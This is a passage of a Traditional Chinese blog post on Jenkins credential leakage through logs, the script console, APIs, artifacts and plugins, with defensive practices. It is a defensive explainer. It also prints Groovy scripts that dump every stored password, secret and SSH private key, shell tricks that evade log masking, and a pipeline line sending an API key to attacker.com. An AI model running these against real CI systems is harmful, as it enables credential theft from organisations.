---
title: "Jenkins 憑證外洩：CI/CD 管線中隱藏的資安風險"
date: 2021-07-01
lang: zh-TW
categories: Development
tags: [Security, DevOps, Jenkins]
excerpt: "Jenkins 憑證可能透過建置日誌、腳本控制台和 API 端點外洩。了解憑證如何被暴露，以及如何保護你的 CI/CD 管線。"
thumbnail: /assets/jenkins/thumbnail.png
---

<style>
img.left-image {
  float: left;
  margin-right: 10px;
  margin-top: 30px;
  max-height: 80px;
  width: auto;
}
</style>

<a href="javascript:void(0);" class="image-wrapper"><img src="/assets/jenkins/icon.png" alt="" class="left-image"></a>
Jenkins 已成為無數 CI/CD 管線的骨幹，在全球組織中協調建置、測試和部署。其靈活性和豐富的外掛生態系統使其功能強大，但這種靈活性也創造了許多憑證外洩的途徑。一個配置錯誤的管線或粗心的腳本，就可能將資料庫密碼、API 金鑰或雲端憑證洩露給任何有權存取建置日誌的人。

本文探討 Jenkins 憑證可能被暴露的各種方式，從明顯的錯誤（如在建置日誌中輸出機密）到外掛配置和 API 端點中的細微漏洞。我們將揭示 Jenkins 部署中的隱藏風險，以及保護 CI/CD 基礎設施中敏感憑證的實用策略。

!!!anote "📝 適用於其他 CI/CD 系統"
    雖然本文專注於 Jenkins，但相同的憑證外洩風險也適用於其他 CI/CD 系統：
    
    **GitLab CI/CD**
    - GitLab Runner 日誌可能暴露機密
    - CI/CD 變數可在任務日誌中存取
    - Artifact 和測試報告可能包含憑證
    - API 端點暴露管線配置
    
    **GitHub Actions**
    - 工作流程日誌暴露回顯的機密
    - Actions 可以存取並洩漏機密
    - Artifact 可能包含嵌入的憑證
    - 除錯模式增加暴露風險
    
    **一般原則**
    - 建置/任務日誌是主要的暴露向量
    - Artifact 和報告會持久化憑證
    - API 存取暴露配置
    - 討論的緩解策略普遍適用

## 理解 Jenkins 憑證

在深入探討外洩風險之前，理解 Jenkins 如何管理憑證至關重要。Jenkins 提供集中式憑證儲存，旨在保護機密安全，同時使管線和任務能夠存取它們。

### Jenkins 憑證系統

Jenkins 憑證有多種類型，各自針對特定用途設計：

!!!anote "🔑 Jenkins 憑證類型"
    **使用者名稱與密碼**
    - 基本身份驗證憑證
    - 用於 Git 儲存庫、artifact 伺服器、API
    - 以加密的鍵值對儲存
    - 最常見的憑證類型
    
    **機密文字**
    - 單一機密值（API 金鑰、權杖）
    - 用於雲端供應商憑證、webhook 機密
    - 在 Jenkins 憑證儲存中加密
    - 簡單但多功能
    
    **機密檔案**
    - 包含機密的完整檔案（憑證、kubeconfig）
    - 加密儲存，在建置期間作為臨時檔案公開
    - 用於 SSH 金鑰、TLS 憑證、配置檔案
    
    **SSH 使用者名稱與私鑰**
    - 用於 Git 和遠端伺服器的 SSH 身份驗證
    - 私鑰加密儲存
    - 支援密碼保護
    
    **憑證**
    - 用於雙向 TLS 的客戶端憑證
    - PKCS#12 金鑰儲存
    - 用於安全的服務對服務通訊

憑證儲存使用儲存在 `$JENKINS_HOME/secrets/master.key` 的主金鑰加密機密。這種加密保護靜態憑證，但一旦憑證在管線中使用，它們就會透過各種管道變得容易外洩。

### 憑證範圍與存取控制

Jenkins 憑證具有範圍和存取控制，決定它們可以在哪裡使用：

!!!tip "🛡️ 憑證範圍"
    **系統範圍**
    - 僅供 Jenkins 系統使用（外掛、配置）
    - 任務或管線無法存取
    - 用於 Jenkins 對 Jenkins 通訊、外掛配置
    
    **全域範圍**
    - 所有任務和管線都可使用
    - 最常用的範圍
    - 如果任務被入侵，外洩風險最高
    
    **資料夾範圍（使用 Folders 外掛）**
    - 憑證限定於特定資料夾
    - 限制暴露於任務子集
    - 比全域範圍更好的隔離
    
    **存取控制**
    - 透過外掛實現基於角色的存取控制（RBAC）
    - 憑證權限與任務權限分離
    - 使用者可以使用憑證而無需查看它們

理解這些範圍至關重要，因為許多憑證外洩發生在全域憑證被用於不需要如此廣泛存取權限的任務時。

## 建置日誌外洩：最常見的錯誤

最常見的憑證外洩發生在建置日誌中——Jenkins 儲存並向使用者顯示的管線執行詳細輸出。

### 意外的 Echo 和 Print 陳述式

開發人員經常透過列印變數值來除錯管線，卻忘記憑證也只是變數：

```groovy
// 宣告式管線 - 危險
pipeline {
    agent any
    environment {
        DB_PASSWORD = credentials('database-password')
    }
    stages {
        stage('Debug') {
            steps {
                // 這會將密碼列印到建置日誌！
                sh "echo Database password is: ${DB_PASSWORD}"
                
                // 這也會暴露它
                echo "Connecting with password: ${DB_PASSWORD}"
            }
        }
    }
}
```

建置日誌將包含：

```
[Pipeline] sh
+ echo Database password is: SuperSecret123!
Database password is: SuperSecret123!
[Pipeline] echo
Connecting with password: SuperSecret123!
```

任何有權存取建置日誌的人——通常包括所有開發人員——現在都可以看到密碼。

### 環境變數傾印

另一個常見錯誤是為了除錯而傾印所有環境變數：

```groovy
pipeline {
    agent any
    environment {
        AWS_ACCESS_KEY = credentials('aws-access-key')
        AWS_SECRET_KEY = credentials('aws-secret-key')
    }
    stages {
        stage('Debug Environment') {
            steps {
                // 暴露所有環境變數，包括憑證
                sh 'env'
                
                // 同樣危險
                sh 'printenv'
                
                // 這也可能洩漏憑證
                sh 'set'
            }
        }
    }
}
```

輸出會揭示載入到環境中的所有憑證：

```
AWS_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
```

### 詳細命令輸出

某些命令會產生包含憑證的詳細輸出：

```groovy
pipeline {
    agent any
    stages {
        stage('Deploy') {
            steps {
                withCredentials([usernamePassword(
                    credentialsId: 'api-credentials',
                    usernameVariable: 'API_USER',
                    passwordVariable: 'API_PASS'
                )]) {
                    // curl 的 -v 旗標會在標頭中暴露憑證
                    sh 'curl -v -u ${API_USER}:${API_PASS} https://api.example.com/deploy'
                }
            }
        }
    }
}
```

詳細輸出包含帶有憑證的 Authorization 標頭：

```
> GET /deploy HTTP/1.1
> Authorization: Basic QVBJVVNFUjpBUElQQVNT
> User-Agent: curl/7.68.0
```

雖然是 base64 編碼，但這很容易解碼以揭示使用者名稱和密碼。

!!!warning "⚠️ 建置日誌外洩風險"
    **誰可以存取建置日誌**
    - 所有具有任務讀取權限的使用者
    - 通常包括整個開發團隊
    - 預設情況下日誌無限期儲存
    - 可透過 Web UI 和 API 存取
    
    **外洩的持久性**
    - 日誌儲存在 `$JENKINS_HOME/jobs/*/builds/*/log`
    - 即使在憑證輪換後仍可存取
    - 包含在 Jenkins 備份中
    - 可能被轉發到日誌聚合系統
    
    **影響範圍**
    - 暴露的憑證可以存取生產系統
    - 可能授予超出 Jenkins 環境的存取權限
    - 事後難以偵測外洩
    - 所有暴露的憑證都需要輪換

## 腳本控制台：管理後門

Jenkins 提供 Groovy 腳本控制台用於管理任務，但這個強大功能可能被利用來提取憑證。

### 直接憑證存取

具有腳本控制台存取權限的使用者可以直接查詢憑證儲存：

```groovy
// 腳本控制台 - 提取所有憑證
import com.cloudbees.plugins.credentials.*
import com.cloudbees.plugins.credentials.domains.*

def creds = CredentialsProvider.lookupCredentials(
    StandardUsernamePasswordCredentials.class,
    Jenkins.instance,
    null,
    null
)

creds.each { c ->
    println "ID: ${c.id}"
    println "Username: ${c.username}"
    println "Password: ${c.password}"
    println "---"
}
```

此腳本以明文輸出所有使用者名稱/密碼憑證：

```
ID: database-credentials
Username: dbadmin
Password: SuperSecret123!
---
ID: api-credentials
Username: apiuser
Password: ApiKey789!
---
```

### 機密文字提取

機密文字憑證同樣容易受到攻擊：

```groovy
import com.cloudbees.plugins.credentials.*
import org.jenkinsci.plugins.plaincredentials.*

def secrets = CredentialsProvider.lookupCredentials(
    StringCredentials.class,
    Jenkins.instance,
    null,
    null
)

secrets.each { s ->
    println "ID: ${s.id}"
    println "Secret: ${s.secret}"
    println "---"
}
```

輸出：

```
ID: aws-secret-key
Secret: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
---
ID: slack-webhook
Secret: https://hooks.slack.com/services/T00000000/B00000000/XXXXXXXXXXXXXXXXXXXX
---
```

### SSH 金鑰提取

甚至 SSH 私鑰也可以被提取：

```groovy
import com.cloudbees.jenkins.plugins.sshcredentials.*

def sshCreds = CredentialsProvider.lookupCredentials(
    SSHUserPrivateKey.class,
    Jenkins.instance,
    null,
    null
)

sshCreds.each { c ->
    println "ID: ${c.id}"
    println "Username: ${c.username}"
    println "Private Key:"
    println c.privateKey
    println "---"
}
```

這會以 PEM 格式輸出完整的私鑰，可直接用於未經授權的存取。

!!!error "🚫 腳本控制台風險"
    **存取控制問題**
    - 需要「Overall/RunScripts」權限
    - 通常授予資深開發人員和 DevOps
    - 基本 Jenkins 中沒有腳本執行的稽核軌跡
    - 腳本以完整的 Jenkins 權限執行
    
    **偵測挑戰**
    - 沒有內建的腳本控制台使用日誌記錄
    - 難以偵測憑證提取
    - 沒有可疑腳本執行的警報
    - 需要額外的外掛來建立稽核軌跡
    
    **緩解複雜性**
    - 無法在不失去功能的情況下停用腳本控制台
    - 限制存取可能影響合法管理
    - 需要信任所有具有腳本存取權限的使用者
    - 考慮使用 Script Security 外掛進行限制

## API 外洩：程式化存取

Jenkins 提供廣泛的 REST 和 CLI API，可能會透過各種端點無意中暴露憑證。

### 任務配置 XML

可以透過 API 檢索任務配置，可能會暴露嵌入在 XML 中的憑證：

```bash
# 檢索任務配置
curl -u admin:token https://jenkins.example.com/job/my-pipeline/config.xml
```

如果憑證在任務配置中硬編碼（這是不良做法但令人驚訝地常見）：

```xml
<project>
  <builders>
    <hudson.tasks.Shell>
      <command>
        mysql -h db.example.com -u dbuser -pHardcodedPassword123! -e "SELECT * FROM users"
      </command>
    </hudson.tasks.Shell>
  </builders>
</project>
```

密碼在 XML 回應中以明文暴露。

### 建置 Artifact 和測試報告

憑證可能透過封存的 artifact 和測試報告洩漏：

```groovy
pipeline {
    agent any
    stages {
        stage('Build') {
            steps {
                withCredentials([string(
                    credentialsId: 'api-key',
                    variable: 'API_KEY'
                )]) {
                    // 將憑證寫入配置檔案
                    sh 'echo "api_key: $API_KEY" > config.yaml'
                    
                    // 封存檔案 - 憑證現在在 artifact 中！
                    archiveArtifacts artifacts: 'config.yaml'
                }
            }
        }
        stage('Test') {
            steps {
                // 測試報告包含環境變數
                sh 'pytest --verbose --capture=no'
                
                // JUnit 報告可能在輸出中包含憑證
                junit 'test-results/*.xml'
            }
        }
    }
}
```

!!!error "🚫 Artifact 和報告外洩"
    **封存的 Artifact**
    - 嵌入憑證的配置檔案
    - 包含機密的建置輸出
    - 可透過 Web UI 和 API 存取
    - 除非清理，否則無限期保留
    - 開發人員下載用於除錯
    
    **測試報告**
    - JUnit XML 報告可能捕獲 stdout/stderr
    - 測試失敗通常包含環境上下文
    - 帶有詳細輸出的 HTML 報告
    - 所有具有任務讀取權限的使用者都可存取

### 建置參數和環境變數

API 端點暴露建置參數和環境變數：

```bash
# 取得包含參數的建置資訊
curl -u admin:token https://jenkins.example.com/job/my-pipeline/1/api/json?tree=actions[parameters[*]]
```

如果憑證作為參數傳遞，回應可能包含憑證值：

```json
{
  "actions": [{
    "parameters": [{
      "name": "DB_PASSWORD",
      "value": "SuperSecret123!"
    }]
  }]
}
```

### 憑證外掛 API

某些憑證外掛暴露可能洩漏資訊的 API：

```bash
# 列出所有憑證（某些外掛允許這樣做）
curl -u admin:token https://jenkins.example.com/credentials/api/json
```

雖然正確配置的外掛會遮罩憑證值，但配置錯誤或外掛漏洞可能會暴露它們。

!!!warning "⚠️ API 外洩向量"
    **配置匯出**
    - 任務配置可能包含嵌入的機密
    - 儲存在 Jenkins 中的管線定義（而非 SCM）
    - 帶有 API 金鑰的外掛配置
    - 帶有系統憑證的全域配置
    
    **建置 Artifact 和報告**
    - 封存的 artifact 中的憑證
    - 帶有機密的配置檔案
    - 帶有憑證輸出的測試報告
    - 封存為 artifact 的日誌檔案
    - 可透過 artifact API 端點存取
    
    **外掛漏洞**
    - 外掛可能透過自訂 API 暴露憑證
    - 憑證處理中的安全漏洞
    - 外掛端點上的存取控制不足
    - 具有已知問題的過時外掛

## 外掛生態系統：第三方風險

Jenkins 廣泛的外掛生態系統透過外掛特定的漏洞和配置錯誤引入了額外的憑證外洩風險。

### Credential Binding 外掛問題

Credential Binding 外掛雖然設計用於安全地暴露憑證，但可能被濫用：

```groovy
pipeline {
    agent any
    stages {
        stage('Deploy') {
            steps {
                withCredentials([string(
                    credentialsId: 'api-key',
                    variable: 'API_KEY'
                )]) {
                    // 將憑證寫入檔案會暴露它
                    sh 'echo $API_KEY > /tmp/api-key.txt'
                    
                    // 檔案在建置後仍保留在代理上
                    sh 'curl -H "Authorization: Bearer $API_KEY" https://api.example.com'
                }
            }
        }
    }
}
```

憑證被寫入一個在代理上持久存在的檔案，其他任務或具有代理存取權限的使用者可以存取。

### Mask Passwords 外掛：軍備競賽

現代 Jenkins 外掛（如 Mask Passwords 和 Credentials Binding）試圖偵測並遮罩建置日誌中的憑證，甚至處理 base64 編碼的值。然而，人類的創造力始終能擊敗自動偵測：

```groovy
pipeline {
    agent any
    options {
        maskPasswords()
    }
    environment {
        PASSWORD = credentials('my-password')
    }
    stages {
        stage('Test') {
            steps {
                // 在日誌中被遮罩：****
                sh 'echo $PASSWORD'
                
                // 現代外掛可以偵測並遮罩這個
                sh 'echo $PASSWORD | base64'
                
                // 但人類的創造力找到了繞過的方法：
                
                // 逐字元列印
                sh 'for i in $(seq 0 ${#PASSWORD}); do echo -n "${PASSWORD:$i:1}"; done'
                
                // 十六進位編碼
                sh 'echo $PASSWORD | xxd -p'
                
                // ROT13 或簡單密碼
                sh 'echo $PASSWORD | tr "A-Za-z" "N-ZA-Mn-za-m"'
                
                // 反轉字串
                sh 'echo $PASSWORD | rev'
                
                // URL 編碼
                sh 'python3 -c "import urllib.parse; print(urllib.parse.quote(\"$PASSWORD\"))"'
                
                // 分割和串接
                sh 'P1=${PASSWORD:0:5}; P2=${PASSWORD:5}; echo "Part1: $P1, Part2: $P2"'
            }
        }
    }
}
```

!!!warning "⚠️ 偵測軍備競賽"
    **外掛能力**
    - 現代外掛偵測精確的憑證匹配
    - 可以識別 base64 編碼的憑證
    - 常見編碼方案的模式匹配
    - 持續更新新的偵測模式
    
    **人類創造力總是獲勝**
    - 無限種轉換字串的方法
    - 自訂編碼方案
    - 字元操作和分割
    - 透過多重轉換進行混淆
    - 外掛無法預測所有可能的轉換
    
    **根本問題**
    - 偵測是被動的，創造力是主動的
    - 每種新的偵測方法都會產生新的繞過技術
    - 不能僅依賴自動遮罩
    - 透過安全設計進行預防至關重要
    - 教育和程式碼審查仍然很關鍵

偵測外掛和繞過技術之間的軍備競賽說明了一個基本事實：你不能依賴自動遮罩來保護憑證。唯一可靠的方法是從一開始就不要將憑證暴露在建置日誌中。

### Git 外掛憑證洩漏

Git 操作可能以各種方式暴露憑證：

```groovy
pipeline {
    agent any
    stages {
        stage('Checkout') {
            steps {
                // 憑證嵌入在 URL 中
                git url: 'https://user:password@github.com/org/repo.git'
                
                // 出現在建置日誌和 git 配置中
                // 儲存在代理上的 .git/config 中
            }
        }
    }
}
```

憑證出現在：
- 檢出期間的建置日誌
- 代理上的 `.git/config` 檔案
- Git reflog 和歷史記錄
- git 操作期間的處理程序列表

!!!error "🚫 外掛相關風險"
    **外掛漏洞**
    - 外掛可能有憑證處理錯誤
    - 安全修補程式並不總是及時應用
    - 某些外掛不安全地儲存憑證
    - 自訂外掛可能缺乏安全審查
    
    **配置複雜性**
    - 每個外掛都有獨特的憑證處理方式
    - 容易引入配置錯誤
    - 文件可能不完整
    - 安全最佳實踐並不總是清楚
    
    **更新挑戰**
    - 外掛更新可能破壞現有任務
    - 由於相容性問題，安全更新延遲
    - 漏洞披露可能滯後於發現
    - 沒有外掛的自動安全掃描

## 常見外洩情境

理解憑證通常如何被暴露，有助於組織識別並防止自己的 Jenkins 部署中的類似漏洞。

### 公開可存取的 Jenkins 實例

未經適當身份驗證就暴露在網際網路上的 Jenkins 實例代表著關鍵漏洞：

!!!warning "⚠️ 公開暴露風險"
    **常見配置錯誤**
    - 從未配置預設安全設定
    - 用於測試的「快速設定」留在生產環境中
    - 防火牆規則配置錯誤或被繞過
    - 腳本控制台無需身份驗證即可存取
    
    **潛在影響**
    - 所有憑證都可透過腳本控制台提取
    - 雲端供應商憑證使資源劫持成為可能
    - 資料庫憑證暴露客戶資料
    - 原始碼儲存庫存取被入侵
    - 可能完全入侵基礎設施
    
    **預防措施**
    - 永遠不要將 Jenkins 直接暴露在網際網路上
    - 要求所有存取都需要身份驗證
    - 使用 VPN 或堡壘主機進行遠端存取
    - 定期進行安全配置稽核
    - 監控未經授權的存取嘗試

### 長期建置日誌外洩

在建置輸出中記錄的憑證可能會長期暴露：

!!!warning "⚠️ 建置日誌風險"
    **如何發生**
    - 為除錯啟用詳細日誌記錄
    - 除錯陳述式從未從管線中移除
    - 所有開發人員都可存取日誌
    - 日誌包含在備份和日誌聚合系統中
    - 沒有自動憑證掃描
    
    **外洩持續時間**
    - 憑證可能暴露數月或數年
    - 難以確定是否被未經授權的方存取
    - 需要大量的憑證輪換
    - 可能需要完整的安全稽核
    
    **緩解措施**
    - 定期對 CI/CD 管線進行安全稽核
    - 自動掃描日誌中的憑證
    - 考慮安全性的建置日誌保留政策
    - 日誌存取的最小權限原則
    - 定期審查管線程式碼以防憑證外洩

### 外掛漏洞

Jenkins 外掛中的安全漏洞可能透過各種向量暴露憑證：

!!!error "🚫 外掛安全風險"
    **常見漏洞模式**
    - 未經身份驗證的 API 端點暴露憑證
    - 憑證檢索的存取控制不足
    - 外掛資料中的不安全憑證儲存
    - 透過錯誤訊息洩漏資訊
    
    **組織挑戰**
    - 外掛更新可能破壞現有任務
    - 由於相容性測試，安全修補程式延遲
    - 組織不知道正在使用的易受攻擊外掛
    - 沒有外掛的自動漏洞掃描
    
    **最佳實踐**
    - 維護已安裝外掛的清單
    - 訂閱 Jenkins 安全公告
    - 實施快速修補流程
    - 在選擇標準中考慮外掛安全性
    - 定期對 Jenkins 實例進行漏洞掃描

## 真實事件:當編碼的憑證並不安全

當你在生產環境中發現憑證外洩時,理論就變成了現實。我親身經歷過這種情況,當時一位同事將他的憑證儲存在 Jenkins 中,以為系統的編碼會保護它們。

Jenkins 任務執行成功,但建置日誌包含了他的編碼憑證——任何有權存取日誌的人都能看到。編碼提供了一種虛假的安全感;base64 和類似方案都是可以輕易逆轉的。對於未經訓練的眼睛來說,它看起來像是隨機字串,但實際上是他的使用者名稱和密碼,只需一個解碼命令就能還原成明文。

當我發現外洩時,我的同事正在休假。這些憑證在多個系統中擁有廣泛的存取權限,使情況變得危急。我不能等他回來——每一小時都會增加未經授權存取的風險。

我立即向他的主管報告。這次對話雖然不舒服但很必要:「你的團隊成員的憑證在 Jenkins 日誌中被暴露了。它們需要立即輪換。」他的主管理解嚴重性並迅速採取行動,鎖定帳戶並啟動密碼重設。安全團隊審查了存取日誌,以查找外洩期間的任何可疑活動。

這次事件突顯了幾個痛苦的真相:

!!!error "🚨 真實外洩的教訓"
    **編碼不是加密**
    - Base64、十六進位和 URL 編碼都是可逆轉換
    - 任何有權存取日誌的人都可以解碼憑證
    - Jenkins 憑證遮罩無法捕獲所有編碼方案
    - 開發人員經常誤解兩者的區別
    
    **外洩在發現後仍持續存在**
    - 日誌在憑證輪換後仍可存取
    - 不知道誰在外洩期間存取了日誌
    - 備份和日誌聚合系統保留副本
    - 通常無法重建完整的稽核軌跡
    
    **組織影響**
    - 緊急回應中斷正常運作
    - 對受影響個人的信任影響
    - 需要對所有管線進行更廣泛的安全審查
    
    **存取權限放大風險**
    - 具有廣泛權限的憑證會產生更大的爆炸半徑
    - 單一外洩可能危及多個系統
    - 最小權限原則變得至關重要
    - 服務帳戶需要與使用者帳戶相同的保護

這次事件迫使我們對 Jenkins 安全實踐進行全面審查。我們實施了自動憑證掃描,根據憑證敏感性限制日誌存取,並進行安全培訓,強調編碼不提供安全性。最重要的是,我們建立了明確的未來事件升級程序——無論誰受到影響或他們是否在場,都不應該猶豫報告憑證外洩。

當發現暴露的憑證時,立即採取行動。

## 保護 Jenkins 憑證

防止憑證外洩需要跨 Jenkins 配置、管線設計和操作實踐的多層防禦。

### 安全管線實踐

設計管線以最小化憑證外洩：

```groovy
pipeline {
    agent any
    stages {
        stage('Deploy') {
            steps {
                withCredentials([usernamePassword(
                    credentialsId: 'api-credentials',
                    usernameVariable: 'API_USER',
                    passwordVariable: 'API_PASS'
                )]) {
                    // 使用憑證而不回顯
                    sh '''
                        # 停用命令回顯
                        set +x
                        
                        # 在命令中使用憑證
                        curl -s -u "$API_USER:$API_PASS" https://api.example.com/deploy
                        
                        # 為後續命令重新啟用回顯
                        set -x
                    '''
                }
            }
        }
    }
}
```

關鍵實踐：
- 使用 `set +x` 在使用憑證時停用命令回顯
- 避免列印環境變數
- 使用 `withCredentials` 區塊限制憑證範圍
- 永遠不要將憑證寫入檔案

### 憑證範圍限制

使用資料夾範圍的憑證限制憑證可用性：

!!!success "✅ 憑證範圍最佳實踐"
    **使用 Folder 外掛**
    - 按團隊或專案將任務組織到資料夾中
    - 建立限定於特定資料夾的憑證
    - 防止其他資料夾中的任務存取憑證
    - 減少被入侵任務的爆炸半徑
    
    **最小權限原則**
    - 為每個用例建立單獨的憑證
    - 避免跨多個任務重複使用憑證
    - 盡可能使用唯讀憑證
    - 定期輪換憑證
    
    **憑證命名**
    - 使用指示範圍和目的的描述性 ID
    - 避免使用「password」或「api-key」等通用名稱
    - 在名稱中包含環境（prod-db-password vs dev-db-password）
    - 記錄憑證目的和授權使用

### 存取控制和稽核

實施嚴格的存取控制和監控：

!!!tip "🔒 存取控制措施"
    **基於角色的存取控制**
    - 使用 Role Strategy 或 Folder Authorization 外掛
    - 將憑證管理與任務執行權限分離
    - 限制腳本控制台存取給最少的使用者
    - 定期審查使用者權限
    
    **稽核日誌記錄**
    - 啟用 Audit Trail 外掛進行憑證存取日誌記錄
    - 監控腳本控制台使用情況
    - 對正常模式之外的憑證檢索發出警報
    - 將 Jenkins 日誌與 SIEM 系統整合
    
    **建置日誌安全**
    - 限制建置日誌保留期限
    - 根據憑證敏感性限制日誌存取（見下方注意事項）
    - 實施自動掃描日誌中的憑證
    - 考慮對敏感管線進行日誌加密
    
    **建置日誌存取注意事項**
    - 任務擁有者通常不擁有任務中使用的憑證
    - 生產憑證通常由安全團隊擁有
    - 具有日誌存取權限的任務擁有者可以查看暴露的憑證
    - 解決方案：限制日誌存取給憑證擁有者，而非任務擁有者
    - 替代方案：自動憑證遮罩（不完美，見前面章節）
    - 最佳方法：完全防止日誌中的憑證外洩

### 分離憑證管理與任務執行

一個關鍵的安全實踐是將誰可以管理憑證與誰可以在任務中使用它們分開。這種分離防止開發人員查看憑證值，同時仍允許他們在管線中使用憑證。

#### 沒有分離的問題

預設情況下，Jenkins 通常授予廣泛的權限：

```groovy
// 沒有適當分離，具有任務配置存取權限的開發人員可以：
pipeline {
    agent any
    stages {
        stage('Extract Credentials') {
            steps {
                withCredentials([string(
                    credentialsId: 'production-api-key',
                    variable: 'API_KEY'
                )]) {
                    // 開發人員可以修改管線以暴露憑證
                    sh 'echo $API_KEY'
                    sh 'echo $API_KEY | base64'
                    sh 'curl https://attacker.com?key=$API_KEY'
                }
            }
        }
    }
}
```

!!!error "🚫 沒有權限分離的風險"
    **開發人員可以做什麼**
    - 修改管線以將憑證回顯到建置日誌
    - 在建置 artifact 中封存憑證
    - 將憑證發送到外部系統
    - 透過測試報告提取憑證
    - 如果被授予存取權限，使用腳本控制台
    
    **為什麼這很危險**
    - 開發人員需要執行任務但不需要看到憑證值
    - 任務配置存取 = 憑證提取能力
    - 沒有技術障礙防止憑證外洩
    - 完全依賴開發人員的可信度
    - 單一惡意或被入侵的開發人員帳戶暴露所有憑證

#### 實施權限分離

使用 Role Strategy 外掛或 Folder Authorization 外掛來分離權限：

**Role Strategy 外掛配置：**

```
全域角色：
  - credential-admin: Credential/Create, Credential/Update, Credential/View, Credential/Delete
  - developer: Job/Build, Job/Read, Job/Workspace
  - pipeline-admin: Job/Configure, Job/Create, Job/Delete

專案角色（每個資料夾）：
  - team-developer: Job/Build, Job/Read, Credential/UseItem
  - team-lead: Job/Configure, Credential/UseItem
  - security-admin: Credential/ManageDomains, Credential/Create, Credential/Update
```

!!!success "✅ 權限分離的好處"
    **憑證管理員**
    - 建立和管理憑證
    - 查看和更新憑證值
    - 無法修改任務配置
    - 通常是安全團隊或資深 DevOps
    
    **管線管理員**
    - 配置和建立任務
    - 無法查看憑證值
    - 可以指定任務使用哪些憑證（透過 ID）
    - 無法透過任務修改提取憑證值
    
    **開發人員**
    - 執行任務並查看建置日誌
    - 無法修改任務配置
    - 無法查看或管理憑證
    - 只能透過預先配置的任務使用憑證

#### 實際實施

開發團隊的實用權限模型：

```
資料夾：/production-deployments/
  憑證：
    - prod-db-password（由安全團隊管理）
    - prod-api-key（由安全團隊管理）
  
  權限：
    - security-team: Credential/Create, Credential/Update, Credential/View, Credential/Delete
    - devops-leads: Job/Configure, Credential/UseItem（可以使用但不能查看）
    - developers: Job/Build, Job/Read（可以執行但不能修改）

資料夾：/development/
  憑證：
    - dev-db-password（由團隊負責人管理）
    - dev-api-key（由團隊負責人管理）
  
  權限：
    - team-leads: Credential/Create, Credential/Update, Job/Configure
    - developers: Job/Build, Job/Configure, Credential/UseItem
```

!!!anote "🎯 關鍵原則"
    **分離防止**
    - 開發人員修改生產管線以提取憑證
    - 透過管線變更意外暴露憑證
    - 被入侵帳戶的惡意憑證提取
    - 不滿員工的內部威脅
    
    **分離允許**
    - 開發人員使用憑證執行任務
    - 管線管理員配置任務使用哪些憑證
    - 安全團隊管理敏感憑證
    - 誰存取了哪些憑證的稽核軌跡
    
    **重要限制**
    - 如果管線已經記錄憑證，則無法防止憑證外洩
    - 無法防止腳本控制台存取（單獨的權限）
    - 無法防止透過 artifact 或報告的外洩
    - 必須與安全管線實踐結合
    - 管線管理員仍然可以配置任務以暴露憑證

#### 監控和執行

必須監控和執行權限分離：

```groovy
// 檢查權限分離的稽核腳本
import jenkins.model.Jenkins
import com.cloudbees.plugins.credentials.*
import hudson.security.*

def jenkins = Jenkins.instance
def strategy = jenkins.getAuthorizationStrategy()

// 檢查誰有憑證管理權限
def credentialAdmins = []
def jobConfigurers = []

strategy.getGrantedPermissions().each { permission, users ->
    if (permission.toString().contains('Credential')) {
        credentialAdmins.addAll(users)
    }
    if (permission.toString().contains('Job/Configure')) {
        jobConfigurers.addAll(users)
    }
}

// 如果相同使用者同時擁有兩種權限，則發出警報
def overlap = credentialAdmins.intersect(jobConfigurers)
if (overlap) {
    println "警告：同時擁有憑證和任務配置權限的使用者：${overlap}"
}
```

!!!tip "🔍 執行最佳實踐"
    **定期稽核**
    - 每季審查權限分配
    - 檢查具有過多權限的使用者
    - 驗證組織變更後是否維持分離
    - 稽核憑證使用模式
    
    **自動監控**
    - 當使用者獲得憑證管理權限時發出警報
    - 監控權限提升嘗試
    - 按使用者和任務追蹤憑證存取
    - 偵測異常的憑證使用模式
    
    **政策執行**
    - 在安全政策中記錄權限模型
    - 要求批准憑證管理存取
    - 定期培訓權限分離的理由
    - 權限違規的事件回應計畫

權限分離是一個關鍵的防禦層，但它並非萬無一失。可以配置任務的管線管理員仍然可以編寫暴露憑證的管線。真正的保護來自於將權限分離與安全管線實踐、程式碼審查和自動憑證掃描相結合。

### 外部機密管理：並非萬靈丹

外部機密管理系統降低風險，但不能消除外洩向量：

```groovy
// 使用 HashiCorp Vault
pipeline {
    agent any
    stages {
        stage('Deploy') {
            steps {
                script {
                    // 在執行時從 Vault 檢索機密
                    def secrets = vault(
                        path: 'secret/data/myapp',
                        engineVersion: 2
                    )
                    
                    // 如果記錄，機密仍然會暴露！
                    sh "echo API Key: ${secrets.api_key}"  // 仍然危險
                    
                    // 機密仍然在 artifact 中暴露
                    sh "echo 'key: ${secrets.api_key}' > config.yaml"
                    archiveArtifacts 'config.yaml'  // 仍然暴露
                    
                    // 正確用法 - 沒有日誌記錄或 artifact
                    sh """
                        set +x
                        curl -H "Authorization: Bearer ${secrets.api_key}" \
                             https://api.example.com/deploy
                    """
                }
            }
        }
    }
}
```

!!!warning "⚠️ 外部機密無法防止所有外洩"
    **外部機密解決什麼**
    - 憑證不在 Jenkins 中靜態儲存
    - 集中式憑證管理和輪換
    - 機密存取的稽核日誌記錄
    - 短期、動態憑證
    - 如果 Jenkins 被入侵，減少爆炸半徑
    
    **外部機密無法解決什麼**
    - 建置日誌外洩（如果回顯，機密仍會被記錄）
    - Artifact 外洩（如果寫入檔案，機密仍會被封存）
    - 測試報告外洩（機密仍在測試輸出中）
    - 腳本控制台存取（機密在記憶體中仍可存取）
    - API 外洩（機密仍在建置參數/環境中）
    
    **根本真相**
    - 外部機密管理改變機密儲存的位置
    - 它不改變機密在管線中的使用方式
    - 所有外洩向量（日誌、artifact、報告）仍然存在
    - 安全管線實踐仍然至關重要
    - 不能僅依賴外部機密來保證安全

!!!success "✅ 外部機密管理的好處"
    **與安全實踐結合時**
    - 集中控制和稽核日誌記錄
    - 動態、短期憑證
    - 更容易的輪換和撤銷
    - 關注點分離
    - 減少 Jenkins 攻擊面
    
    **熱門解決方案**
    - HashiCorp Vault
    - AWS Secrets Manager
    - Azure Key Vault
    - Google Secret Manager
    - CyberArk
    
    **關鍵要求**
    - 必須與安全管線設計結合
    - 消除日誌記錄、artifact 和報告外洩
    - 外部機密是一層，而非完整解決方案

## 偵測和回應

即使有預防措施，偵測和回應憑證外洩也至關重要。

### 自動憑證掃描

實施自動掃描以偵測暴露的憑證：

!!!tip "🔍 掃描策略"
    **建置日誌掃描**
    - 常見憑證格式的正規表示式模式
    - API 金鑰模式（AWS、GitHub、Slack 等）
